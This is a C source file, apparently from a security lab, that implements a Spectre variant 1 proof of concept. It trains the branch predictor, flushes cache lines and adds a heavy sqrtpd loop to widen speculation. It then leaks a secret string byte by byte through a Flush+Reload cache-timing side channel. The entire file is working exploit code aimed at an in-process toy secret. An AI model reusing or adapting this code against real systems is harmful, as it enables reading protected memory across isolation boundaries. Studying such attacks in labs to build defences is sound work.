#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include<string.h>
#include<ctype.h>
#include <stdint.h>

//Leak entire string - identical to spectre attack but greater ALU load required to improve results
unsigned int buffer_size = 10;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; 
uint8_t temp = 0;
char *secret = "Big_secret";   
uint8_t array[256*4096];

#define CACHE_HIT_THRESHOLD (150)
#define DELTA 1024

// Sandbox Function
uint8_t restrictedAccess(size_t x)
{
  if (x < buffer_size) {
     return buffer[x];
  } else {
     return 0;
  } 
}

void flushSideChannel()
{
  int i;
  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
  //flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);
}

void reloadSideChannel()
{
	int index=0;
  int junk=0;
  register uint64_t time1, time2;
  volatile uint8_t *addr;
  int i;
  for(i = 0; i < 256; i++){
    addr = &array[i*4096 + DELTA];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    if (time2 <= CACHE_HIT_THRESHOLD){
				//printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
        if(isalpha(i))
        	 printf("%c.",i);
        //if(i!=0) leakedChars[index++] = (char)i;
    }
  } 
}
void spectreAttack(size_t larger_x)
{
  int i;
  uint8_t s;
  volatile int z;
  // Train the CPU to take the true branch inside restrictedAccess().
  for (i = 0; i < 10; i++) { 
   _mm_clflush(&buffer_size);
   restrictedAccess(i); 
  }
  // Flush buffer_size and array[] from the cache.
  _mm_clflush(&buffer_size);
  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
  
  for (i = 0; i < 1000; i++)
	{	for (z = 0; z < 1000; z++) { 
	 	asm volatile(
			".rept 1000;"
			"sqrtpd %%xmm0, %%xmm0;"
			".endr;"
			
			:
			:
			:"eax"
		);
		}
	}
  // Ask restrictedAccess() to return the secret in out-of-order execution. 
  s = restrictedAccess(larger_x);  
  array[s*4096 + DELTA] += 88;  
  //_mm_clflush(&array[0*4096 + DELTA]);
}

int main() {
	printf("Secret = %s\n", secret);
//	char* leakedChars = (char*)malloc(strlen(secret)*sizeof(char));
	size_t larger_x;
	char* ptr = secret;
	for(;*ptr!=0;ptr++)
	{
  	flushSideChannel();
  	larger_x = (size_t)(ptr - (char*)buffer);  
  	spectreAttack(larger_x);
//  	 _mm_clflush(&array[0*4096 + DELTA]);
  	reloadSideChannel();
  }
  printf("\n");
  return (0);
}
